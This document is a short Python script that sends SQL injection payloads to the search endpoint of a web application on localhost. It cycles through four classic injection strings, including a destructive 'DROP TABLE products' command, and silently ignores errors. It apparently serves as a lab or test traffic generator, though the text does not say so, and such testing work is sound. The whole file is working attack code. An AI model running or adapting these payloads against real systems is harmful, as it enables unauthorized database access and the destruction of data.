import requests, time

BASE="http://127.0.0.1:8080"
SIGNS = ["' OR '1'='1", "'; DROP TABLE products; --", "' OR '1'='1' --", "\" OR \"\" = \"\""]
def run_attack_once(times=5, pause=1):
    for i in range(times):
        payload = SIGNS[i % len(SIGNS)]
        try:
            requests.get(BASE + "/search?q=" + requests.utils.quote(payload), timeout=5)
        except Exception:
            pass
        time.sleep(pause)
